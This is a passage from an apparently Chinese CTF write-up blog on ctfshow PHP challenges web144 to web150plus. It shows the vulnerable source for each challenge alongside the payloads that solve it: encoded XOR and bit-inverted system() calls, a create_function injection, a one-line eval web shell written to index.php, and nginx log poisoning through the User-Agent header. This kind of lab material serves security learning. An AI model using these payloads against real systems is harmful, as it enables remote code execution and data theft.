class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>和web141基本一致，限制的是v2稍加进行修改即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v3=-&amp;v2=(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F);<br></code></pre></td></tr></table></figure><h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-18 17:41:33</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;get out hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x01-17"><a href="#0x01-17" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=2&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F):<br></code></pre></td></tr></table></figure><h3 id="0x02-17"><a href="#0x02-17" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=2&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|<br></code></pre></td></tr></table></figure><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-10-18 17:41:33</span><br><br>*/<br><br><br>highlight_file(__FILE__);<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(is_numeric(<span class="hljs-variable">$v1</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>                die(<span class="hljs-string">&#x27;get out hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;return $v1$v3<span class="hljs-variable">$v2</span>;&quot;</span>);<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;$v1$v3<span class="hljs-variable">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用上一题的0x02的payload可以正常得到答案</p><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-19 02:04:38</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="hljs-variable">$ctfshow</span>)) &#123;<br>        <span class="hljs-variable">$ctfshow</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>确保 <code>$ctfshow</code> 只包含小写字母、数字和下划线（正则表达式 <code>^[a-z0-9_]*$</code>）。</p><ul><li>**<code>i</code>**：忽略大小写。</li><li>**<code>s</code>**：使 <code>.</code> 可以匹配换行符。</li><li>**<code>D</code>**：禁用多行模式（<code>^</code> 和 <code>$</code> 只匹配整个字符串的开头和结尾）。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?show=;&#125;system(<span class="hljs-string">&#x27;tac f*&#x27;</span>);//<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctf=\create_function<br></code></pre></td></tr></table></figure><p>show需要提前进行闭合，后面需要进行注释掉，以便可以正常执行，下面的ctf输入<code>\</code>是为了能够进行绕过，这个函数是用于进行创造一个函数进行执行，详细的可以网上搜索一下</p><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-19 03:52:11</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_ctfshow_fl0g</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>直接进行异或</p><h3 id="0x01-18"><a href="#0x01-18" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=(<span class="hljs-string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="hljs-string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="hljs-string">&quot;%0c%0c&quot;</span>^<span class="hljs-string">&quot;%60%7f&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=(<span class="hljs-string">&quot;%08%02%08%09%05%0d&quot;</span>^<span class="hljs-string">&quot;%7b%7b%7b%7d%60%60&quot;</span>)(<span class="hljs-string">&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;</span>^<span class="hljs-string">&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x02-18"><a href="#0x02-18" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=$哈=<span class="hljs-string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="hljs-string">&quot;?&lt;&gt;/&quot;</span>;<span class="hljs-variable">$&#123;$哈&#125;</span>[哼](<span class="hljs-variable">$&#123;$哈&#125;</span>[嗯]);&amp;哼=system&amp;嗯=<span class="hljs-built_in">tac</span> f*<br></code></pre></td></tr></table></figure><p>官方预期解</p><h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-19 04:34:40</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br><br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码审计一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码是遍历当前目录下的文件是否有叫index.php的，如果有就进行删除</p><p>可以利用这一点进行一句话木马上传</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ctf=index.php<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">show=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后回到页面执行一句话得到了具体的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1=system(<span class="hljs-string">&#x27;cat /ctfshow_fl0g_here.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-19 07:12:57</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTFSHOW</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$vip</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$secret</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;vip = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;secret = <span class="hljs-variable">$flag</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;secret;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isVIP</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;vip?<span class="hljs-literal">TRUE</span>:<span class="hljs-literal">FALSE</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__autoload</span>(<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$class</span>))&#123;<br>            <span class="hljs-variable">$class</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">#过滤字符</span><br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="hljs-variable">$key</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$ctf</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-variable">$__CTFSHOW__</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;class is exists!&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$isVIP</span> &amp;&amp; <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$ctf</span>, <span class="hljs-string">&quot;:&quot;</span>)===<span class="hljs-literal">FALSE</span>)&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$ctf</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>既然是非预期题目就用非预期来写，先上payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?isVIP=TRUE<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctf=/var/log/nginx/access.log&amp;1=system(<span class="hljs-string">&#x27;cat f*&#x27;</span>);<br></code></pre></td></tr></table></figure><p>给ua头上个一句话<code>&lt;?php eval($_POST[1]);?&gt;</code>，查看网页源码得到flag</p><p><code>strrpos($ctf, &quot;:&quot;)</code> 是 PHP 中的一个函数调用，它的作用是查找字符串中最后一次出现指定字符的位置。从题目中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">isVIP</span></span>()&#123;<br>       <span class="hljs-built_in">return</span> <span class="hljs-variable">$this</span>-&gt;vip?TRUE:FALSE;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>要满足这个限制，所以<code>isVIP</code>进行了限制，只要后面的是不符合的即没有:就行，利用nginx特性，具体对照web4这题，写入日志得到falg</p><h2 id="web150plus"><a href="#web150plus" class="headerlink" title="web150plus"></a>web150plus</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-10-19 07:12:57</span><br><br>*/<br>include(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>error_reporting(0);<br>highlight_file(__FILE__);<br><br>class CTFSHOW&#123;<br>    private <span class="hljs-variable">$username</span>;<br>    private <span class="hljs-variable">$password</span>;<br>    private <span class="hljs-variable">$vip</span>;<br>    private <span class="hljs-variable">$secret</span>;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__construct</span></span>()&#123;<br>        <span class="hljs-variable">$this</span>-&gt;vip = 0;<br>        <span class="hljs-variable">$this</span>-&gt;secret = <span class="hljs-variable">$flag</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__destruct</span></span>()&#123;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-variable">$this</span>-&gt;secret;<br>    &#125;<br><br>    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span 